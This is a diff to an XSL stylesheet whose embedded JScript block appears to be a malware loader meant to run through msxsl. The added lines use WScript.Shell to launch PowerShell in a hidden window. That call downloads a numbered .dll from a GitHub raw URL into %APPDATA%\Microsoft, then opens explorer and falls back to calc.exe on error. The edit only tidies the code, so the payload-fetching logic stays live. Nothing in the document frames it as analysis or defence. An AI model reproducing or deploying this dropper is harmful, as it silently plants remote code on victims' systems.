@@ -11,22 +11,19 @@
 	<script language="JScript">
 		<![CDATA[
 
-			// Build path to %APPDATA%\Microsoft\test.txt
-			var shell = new ActiveXObject("WScript.Shell");
-			var env = shell.ExpandEnvironmentStrings("%APPDATA%\\Microsoft\\7346832764233279.dll");
-
-			var url = "https://github.com/MohamedAbderraouf/hostingmsxsl/raw/refs/heads/main/7346832764233279.dll";
-
-			try {
-				var shell = new ActiveXObject("WScript.Shell");
-				var ps = 'powershell -Command "Invoke-WebRequest ''https://github.com/MohamedAbderraouf/hostingmsxsl/raw/refs/heads/main/7346832764233279.dll'' -OutFile ''$env:APPDATA\\Microsoft\\7346832764233279.dll''"';
-				shell.Run(ps, 0, true);
-				var r = new ActiveXObject("WScript.Shell").Run('explorer.exe "C:\"');
-
-			}
-			} catch(e) {
-				var r = new ActiveXObject("WScript.Shell").Run('calc.exe');
-			}
+			    // Build path to %APPDATA%\Microsoft\7346832764233279.dll
+		            var shell = new ActiveXObject("WScript.Shell");
+		            var env = shell.ExpandEnvironmentStrings("%APPDATA%\\Microsoft\\7346832764233279.dll");
+		
+		            var url = "https://github.com/MohamedAbderraouf/hostingmsxsl/raw/refs/heads/main/7346832764233279.dll";
+		
+		            try {
+		                var ps = 'powershell -Command "Invoke-WebRequest ''https://github.com/MohamedAbderraouf/hostingmsxsl/raw/refs/heads/main/7346832764233279.dll'' -OutFile ''$env:APPDATA\\Microsoft\\7346832764233279.dll''"';
+		                shell.Run(ps, 0, true);
+		                shell.Run('explorer.exe "C:\\"', 0, true);
+		            } catch(e) {
+		                shell.Run('calc.exe');
+		            }
 
 		]]>
 	</script>
